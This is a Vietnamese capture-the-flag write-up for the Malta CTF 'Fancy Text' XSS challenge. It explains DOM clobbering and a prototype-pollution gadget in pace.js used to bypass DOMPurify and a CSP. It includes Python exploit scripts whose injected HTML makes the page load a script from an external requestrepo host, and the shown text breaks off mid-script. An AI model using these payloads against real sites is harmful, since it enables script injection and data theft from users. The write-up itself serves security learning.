               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>FANCY TEXT - 3HLD</title>

    

    

    
    <meta name="author" content="3HLD" />
    

    
        <meta property="og:title" content="FANCY TEXT" />
<meta property="og:description" content="Malta CTF Gi·∫£i n√†y m√¨nh ch·ªâ l√†m ƒë∆∞·ª£c c√≥ m·ªôt b√†i thui &hellip;. b√†i ƒë·∫ßu kh√° d·ªÖ n√™n m√¨nh s·∫Ω vi·∫øt v·ªÅ c√¢u 2.
Fancy text B√†i n√†y l√† m·ªôt b√†i XSS nh∆∞ng s·ª≠ d·ª•ng DOMPURIFY latest v√† CSP ƒë·ªÉ ch·∫∑n h·∫ßu h·∫øt m·ªçi ƒë∆∞·ªùng . Source code ƒë∆°n gi·∫£n nh∆∞ sau : index.html
&lt;head&gt; &lt;title&gt;Fancy Text Generator!&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY&#43;DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Fancy text generator&lt;/h1&gt; &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/maltactf2025/fancy/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2025-06-23T18:30:32+02:00" />
<meta property="article:modified_time" content="2025-06-23T18:30:32+02:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="FANCY TEXT"/>
<meta name="twitter:description" content="Malta CTF Gi·∫£i n√†y m√¨nh ch·ªâ l√†m ƒë∆∞·ª£c c√≥ m·ªôt b√†i thui &hellip;. b√†i ƒë·∫ßu kh√° d·ªÖ n√™n m√¨nh s·∫Ω vi·∫øt v·ªÅ c√¢u 2.
Fancy text B√†i n√†y l√† m·ªôt b√†i XSS nh∆∞ng s·ª≠ d·ª•ng DOMPURIFY latest v√† CSP ƒë·ªÉ ch·∫∑n h·∫ßu h·∫øt m·ªçi ƒë∆∞·ªùng . Source code ƒë∆°n gi·∫£n nh∆∞ sau : index.html
&lt;head&gt; &lt;title&gt;Fancy Text Generator!&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY&#43;DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Fancy text generator&lt;/h1&gt; &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!"/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">3HLD</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#fancy-text">Fancy text</a></li>
    <li><a href="#ch∆∞∆°ng-tr√¨nh-n√†y-l√†m-g√¨-">Ch∆∞∆°ng tr√¨nh n√†y l√†m g√¨ .</a>
      <ul>
        <li><a href="#l√†m-sao-kh√¥ng-b·ªã-·∫£nh-h∆∞·ªüng-b·ªüi-h√†m-fancy-text">L√†m sao kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi h√†m fancy text.</a></li>
      </ul>
    </li>
    <li><a href="#ƒë·ªçc-write-up">ƒê·ªçc write up</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">web</div>

  
    <div class="badge">204 points</div>

  
    <div class="badge">25 solves</div>

  
    <div class="badge">downgrade</div>

  
</div>

<div>
  <p class="date">
    Last edit: Jun 23, 2025
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    
<h1 id="malta-ctf" class="header-anchor-wrapper">Malta CTF
  <a href="#malta-ctf" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<blockquote>
<p>Gi·∫£i n√†y m√¨nh ch·ªâ l√†m ƒë∆∞·ª£c c√≥ m·ªôt b√†i thui &hellip;. b√†i ƒë·∫ßu kh√° d·ªÖ n√™n m√¨nh s·∫Ω vi·∫øt v·ªÅ c√¢u 2.</p>
</blockquote>

<h2 id="fancy-text" class="header-anchor-wrapper">Fancy text
  <a href="#fancy-text" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>B√†i n√†y l√† m·ªôt b√†i XSS nh∆∞ng s·ª≠ d·ª•ng DOMPURIFY latest v√† CSP ƒë·ªÉ ch·∫∑n h·∫ßu h·∫øt m·ªçi ƒë∆∞·ªùng .
Source code ƒë∆°n gi·∫£n nh∆∞ sau :</li>
</ul>
<p><em>index.html</em></p>
<pre  class="mc-prism hide language-text" ><code class="language-html">&lt;head&gt;
    &lt;title&gt;Fancy Text Generator!&lt;/title&gt;
    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css&quot; rel=&quot;stylesheet&quot;&gt;
    &lt;link href=&quot;/style.css&quot; rel=&quot;stylesheet&quot;&gt;
    &lt;script integrity=&quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&quot; src=&quot;/loader.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h1&gt;Fancy text generator&lt;/h1&gt;
    &lt;div id=&quot;contentBox&quot;&gt;&lt;%- text || &quot;fancy text generator!&quot; %&gt;&lt;/div&gt;
    &lt;/br&gt;
    &lt;form action=&quot;/&quot; method=&quot;GET&quot;&gt;
        &lt;input name=&quot;text&quot; placeholder=&quot;text to make fancy&quot;&gt;
        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;
</code></pre>
<p><em>loader.js</em></p>
<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
    &quot;main&quot;: &quot;/main.js&quot;,
}

function appendScript(src) {
    let script = document.createElement('script');
    script.src = src;
    document.head.appendChild(script);
};

for (let script in scripts) {
    appendScript(scripts[script]);
}

</code></pre>
<p>main.js</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const toFancyText = (text) =&gt; {
    const fancyLowerStart = 0x1D51E; // 'a'
    const fancyUpperMap = {
        A: 0x1D504, B: 0x1D505, C: 0x212D, D: 0x1D507, E: 0x1D508,
        F: 0x1D509, G: 0x1D50A, H: 0x210C, I: 0x2111, J: 0x1D50D,
        K: 0x1D50E, L: 0x1D50F, M: 0x1D510, N: 0x1D511, O: 0x1D512,
        P: 0x1D513, Q: 0x1D514, R: 0x211C, S: 0x1D516, T: 0x1D517,
        U: 0x1D518, V: 0x1D519, W: 0x1D51A, X: 0x1D51B, Y: 0x1D51C, Z: 0x2128
    };

    return [...text].map(char =&gt; {
        const code = char.charCodeAt(0);

        // a-z
        if (code &gt;= 97 &amp;&amp; code &lt;= 122) {
            return String.fromCodePoint(fancyLowerStart + (code - 97));
        }

        // A-Z
        if (char in fancyUpperMap) {
            return String.fromCodePoint(fancyUpperMap[char]);
        }

        // Leave others (numbers, punctuation) unchanged
        return char;
    }).join('');
}

contentBox.innerText = toFancyText(contentBox.innerText)
</code></pre>
<p><em>server.js</em></p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express')
const app = express();
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

app.set('view engine', 'ejs');
app.use(express.static('static'))

app.use((req, res, next) =&gt; {
    res.set('Content-Security-Policy', &quot;script-src 'sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=' 'strict-dynamic'; object-src 'none';&quot;);
    next();
});

app.get('/', (req, res) =&gt; {
    const window = new JSDOM('').window;
    const DOMPurify = createDOMPurify(window);
    ///return res.render('index', {text: DOMPurify.sanitize(req.query.text)})
    return res.render('index', { text: req.query.text })
})

app.listen(process.env.PORT || 1337, () =&gt; {
    console.log(`listening on ${process.env.PORT || 1337}`)
})

</code></pre>

<h2 id="ch∆∞∆°ng-tr√¨nh-n√†y-l√†m-g√¨-" class="header-anchor-wrapper">Ch∆∞∆°ng tr√¨nh n√†y l√†m g√¨ .
  <a href="#ch%c6%b0%c6%a1ng-tr%c3%acnh-n%c3%a0y-l%c3%a0m-g%c3%ac-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ol>
<li>Cho ph√©p user nh·∫≠p input v√†o sau ƒë√≥ input s·∫Ω ƒëi qua h√†m main v√† bi·∫øn ƒë·ªïi sang c√°c k√≠ t·ª± ƒë·∫∑c bi·ªát kh√°c nhau.</li>
<li>S·ª≠ d·ª•ng script intergrity ƒë·ªÉ ch·ªëng vi·ªác file loader.js b·ªã thay ƒë·ªïi n√™n ta c√≥ th·ªÉ lo·∫°i b·ªè vi·ªác load m·ªôt file script kh√°c t·ª´ b√™n ngo√†i v√†o.</li>
<li>D√πng dompurify ƒë·ªÉ lo·∫°i b·ªè h·∫øt c√°c tag nguy hi·ªÉm.</li>
</ol>
<p>Sau ƒë√≥ m√¨nh ƒë·ªçc h√†m loader.js th√¨ th·∫•y n√≥ c√≥ th·ªÉ load script ƒë·∫øn &ldquo;/main.js&rdquo; v√† &ldquo;pace.js&rdquo; .Sau khi check csp th√¨ m√¨nh th·∫•y n√≥ thi·∫øu base uri check .
<img alt="image" src="https://hackmd.io/_uploads/B1zKFYSNlx.png"></p>
<ul>
<li>Nh∆∞ng Dompurify v·∫´n s·∫Ω sanitize n√≥ .</li>
</ul>

<h3 id="l√†m-sao-kh√¥ng-b·ªã-·∫£nh-h∆∞·ªüng-b·ªüi-h√†m-fancy-text" class="header-anchor-wrapper">L√†m sao kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi h√†m fancy text.
  <a href="#l%c3%a0m-sao-kh%c3%b4ng-b%e1%bb%8b-%e1%ba%a3nh-h%c6%b0%e1%bb%9fng-b%e1%bb%9fi-h%c3%a0m-fancy-text" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h3>

<ul>
<li>
<p>L√∫c n√†y m√¨nh v·∫´n kh√¥ng bi·∫øt l√†m sao ƒë·ªÉ l·∫•y ƒë∆∞·ª£c xss n√™n m√¨nh nghƒ© ƒë·∫øn vi·ªác l√†m sao ƒë·ªÉ truy·ªÅn payload t√πy √Ω v√†o m√† kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi fancyText ƒë√£.</p>
</li>
<li>
<p>L√∫c n√†y m√¨nh th·∫•y c√≥ bug Dom clobbering ·ªü ch·ªó</p>
</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">contentBox.innerText = toFancyText(contentBox.innerText)
</code></pre>
<ul>
<li>V·∫≠y ta c√≥ th·ªÉ ch√®n b·∫•t k√¨ tag n√†o v·ªõi id &ldquo;contentBox&rdquo; th√¨ n√≥ s·∫Ω crash c√°i h√†m main n√†y v√† ta c√≥ th·ªÉ d√πng <em><strong>html injection</strong></em></li>
<li>Nh∆∞ng v·∫•n ƒë·ªÅ l·ªõn nh·∫•t v·∫´n l√† Dompurify v√† m√¨nh ƒë√£ b√≠ t·ª´ ƒë√¢y..</li>
<li>Sau ƒë√≥ m√¨nh nghƒ© ƒë·∫øn vi·ªác dom cloberring ƒë∆∞·ª£c bi·∫øn <strong>scripts</strong>
<img alt="image" src="https://hackmd.io/_uploads/BJd4cKBNxe.png"></li>
<li>Nh∆∞ng sau khi th·ª≠ th√¨ m√¨nh nh·∫≠n ra Dompurify ƒë√£ t√≠nh ƒë·∫øn tr∆∞·ªùng h·ª£p n√†y :vv .
M√¨nh c√≥ th·ªÉ clober &ldquo;script&rdquo; nh∆∞ng &ldquo;scripts&rdquo; th√¨ kh√¥ng . Xem h√¨nh b√™n d∆∞·ªõi  ( m√¨nh s·∫Ω t√¨m hi·ªÉu v·∫•n ƒë·ªÅ n√†y sau&hellip;)
<img alt="image" src="https://hackmd.io/_uploads/Byk_5KS4lg.png">
<img alt="image" src="https://hackmd.io/_uploads/SyvuqFHEgg.png"></li>
<li>Nh∆∞ng m√¨nh nh·∫≠n ra l√† cho d√π c√≥ dom cloberring ƒë∆∞·ª£c th√¨ c≈©ng ch·∫≥ng c√≥ √Ω nghƒ©a g√¨ v√¨ javascript scope ·ªü ƒë√¢y.
V·∫≠y l√† t·ªõi ƒë√¢y m√¨nh b√≠ to√†n t·∫≠p &hellip;.</li>
</ul>

<h2 id="ƒë·ªçc-write-up" class="header-anchor-wrapper">ƒê·ªçc write up
  <a href="#%c4%91%e1%bb%8dc-write-up" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>Sau khi ƒë·ªçc write up m√¨nh ƒë√£ nh·∫≠n ra c√°i ngu c·ªßa m√¨nh.</li>
<li>ƒê√≥ l√† m√¨nh ƒë√£ qu√™n ki·ªÉm tra package &ldquo;pace.js&rdquo; ƒë∆∞·ª£c load v√†o &hellip;. ƒê√°ng l·∫Ω ra m√¨nh ph·∫£i ki·ªÉm tra m·ªçi input ƒë∆∞·ª£c ƒëi v√†o app c·ªßa m√¨nh m·ªõi ƒë√∫ng. ƒê·∫øn ƒë√¢y th√¨ ƒë·ªçc source c·ªßa pace.js l√† ƒë∆∞·ª£c.
Sau ƒë√≥ th√¨ m√¨nh t√¨m ƒë∆∞·ª£c report n√†y v√†o nƒÉm 2024 , yeah 2024 :)
<a href="https://github.com/CodeByZach/pace/issues/546">https://github.com/CodeByZach/pace/issues/546</a>
M·ªôt bug kh√° l·ªõn nh∆∞ng c√≥ v·∫ª b√™n developers kh√¥ng c√≤n maintain n·ªØa.
B·∫£n ch·∫•t c·ªßa bug n√†y c≈©ng l√† merge prototype thui.</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">extend = function() {
		var key, out, source, sources, val, _i, _len;
		out = arguments[0], sources = 2 &lt;= arguments.length ? __slice.call(arguments, 1) : [];
		for (_i = 0, _len = sources.length; _i &lt; _len; _i++) {
			source = sources[_i];
			if (source) {
				for (key in source) {
					if (!__hasProp.call(source, key)) continue;
					val = source[key];
					if ((out[key] != null) &amp;&amp; typeof out[key] === 'object' &amp;&amp; (val != null) &amp;&amp; typeof val === 'object') {
						extend(out[key], val);
					} else {
						out[key] = val;
					}
				}
			}
		}
		return out;
	};
</code></pre>
<p>V√† m√¨nh s·∫Ω c√≥ th·ªÉ <strong>OBJECT PROTOTYPE</strong> b·∫•t k√¨ bi·∫øn n√†o ch·ªâ v·ªõi :</p>
<pre  class="mc-prism hide language-text" ><code class="language-html=">  &lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;YOU ARE POLLUTED!&quot;}}'&gt;
</code></pre>
<ul>
<li>ƒê·∫øn ƒë√¢y th√¨ √Ω t∆∞·ªüng c·ªßa b√†i write up l√† Object prototype m·ªôt bi·∫øn b·∫•t k√¨ c√≥ gi√° tr·ªã b·∫±ng m·ªôt script source c·ªßa attacker . M·ª•c ƒë√≠ch ch√≠nh l√† pollute bi·∫øn <strong>script</strong> trong loader.js</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
    &quot;main&quot;: &quot;/main.js&quot;,
}

function appendScript(src) {
    let script = document.createElement('script');
    script.src = src;
    document.head.appendChild(script);
};

// This will loop through our &quot;polluted&quot; : &quot;//attacker.js&quot;
for (let script in scripts) {
    appendScript(scripts[script]);
}
</code></pre>
<ul>
<li>ƒê·ªçc ƒë·∫øn ƒë√¢y m√¨nh th·∫•y kh√° b·∫•t ng·ªù khi object prototype c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ƒë·∫øn c·∫£ loop for in ?</li>
<li>Test th·ª≠ th√¨ m√¨nh th·∫•y qu·∫£ th·∫≠t v·∫≠y;</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
    &quot;main&quot;: &quot;/main.js&quot;,
}

Object.prototype.polluted = &quot;FUCKED&quot;
console.log(&quot;Just log it out : &quot;, scripts)

for (let script in scripts) {
    console.log(&quot;[&quot; + script + &quot;] =&gt; &quot; + scripts[script])
}

/*OUTPUT : 
Just log it out :  {
  pace: 'https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js',
  main: '/main.js'
}
[pace] =&gt; https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js
[main] =&gt; /main.js
[polluted] =&gt; FUCKED
*/
</code></pre>
<p>Hmmmm, nh√¨n r·∫•t l·∫° nh·ªâ .
<img alt="image" src="https://hackmd.io/_uploads/rkl90FBVge.png"></p>
<p>Sau khi ƒë·ªçc docs th√¨ m√¨nh th·∫•y for in s·∫Ω loop qua nh·ªØng enumerables c·ªßa ch√≠nh n√≥ v√† c·∫£ nh·ªØng enumerables c·ªßa Object.prototype ~~</p>
<ul>
<li>Th√¥ng tin chi ti·∫øt v·ªÅ th·∫ø n√†o l√† enumberables ch√∫ng ta c√≥ th·ªÉ xem ·ªü ƒë√¢y :
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties</a>
V√† c√°c h√†m ƒë·ªÉ ki·ªÉm tra enumrables hay kh√¥ng :
<img alt="image" src="https://hackmd.io/_uploads/SJbg1crExx.png">
Ta c√≥ th·ªÉ th·∫•y h√†m in khi n√†y s·∫Ω xem Enumrable + inherited l√† true v√† ch√≠nh v√¨ th·∫ø script c·ªßa m√¨nh s·∫Ω b·ªã polluted khi for in qua.</li>
</ul>

<h1 id="v·∫•n-ƒë·ªÅ-cu·ªëi-c√πng" class="header-anchor-wrapper">V·∫•n ƒë·ªÅ cu·ªëi c√πng
  <a href="#v%e1%ba%a5n-%c4%91%e1%bb%81-cu%e1%bb%91i-c%c3%b9ng" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>ƒê·ªçc write up th√¨ m√¨nh th·∫•y c√≥ v·∫ª c√≤n m·ªôt bug ·ªü trong pace js ƒë·ªÉ c√≥ th·ªÉ ch√®n html injection n·ªØa :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">    var _custom_class_name = (options.className !== '') ? ' ' + options.className : '';
                this.el.innerHTML = '&lt;div class=&quot;pace-progress' + _custom_class_name + '&quot;&gt;\n  &lt;div class=&quot;pace-progress-inner&quot;&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class=&quot;pace-activity&quot;&gt;&lt;/div&gt;';
</code></pre>
<p>ƒê∆°n gi·∫£n l√† d√πng options className r√≤i inject v√†o nh∆∞ng v√¨ m√¨nh ƒë√£ c√≥ free html injection r√≤i n√™n l√†m ng·∫Øn thui..</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">import requests


url =&quot;https://fancy-text-generator-web.shared.challs.mt/&quot;
url =&quot;http://localhost:1337&quot;

html = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}}'&gt;
            '''
text =  html + '&lt;a id =&quot;contentBox&quot;&gt;'
res = requests.get(url,params={&quot;text&quot;:text})
print(res.text)
print(text)

</code></pre>
<p>V·∫≠y l√† ƒë√£ polluted th√†nh c√¥ng .
<img alt="image" src="https://hackmd.io/_uploads/BygxI9BNlg.png"></p>
<ul>
<li>ƒê·∫øn ƒë√¢y th√¨ v·∫•n ƒë·ªÅ l√† m√¨nh c·∫ßn g·ªçi script /loader.js m·ªôt l·∫ßn n·ªØa ƒë·ªÉ load v√†o nh∆∞ng m√¨nh kh√¥ng th·ªÉ bypass ƒë∆∞·ª£c DOM purify . Cu·ªëi c√πng v·∫´n ph·∫£i d√πng gadget className c·ªßa pace js thui :vvv . N√≥ s·∫Ω gi√∫p m√¨nh bypass b·∫±ng c√°ch m·ªçi payload ƒë·ªÅu n·∫±m trong m·ªôt html attribute n√™n s·∫Ω valid khi ƒëi qua Dompurify.</li>
<li>Sau m·ªôt h·ªìi ng·ªìi escape c√°c th·ª© th√¨ m√¨nh c√≥ script sau :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
import urllib.parse
import html



url =&quot;http://localhost:1338&quot;
url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;

options = &quot;&quot;

#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}}'&gt;&lt;script&gt;alert()&lt;/script&gt;'''

def html_encode(s):
    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)

payload ='''aaaa\\&quot;&gt;&lt;script integrity=\\&quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\\&quot; src=\\&quot;/test.js?version=1\\&quot;&gt;&lt;/script&gt;'''
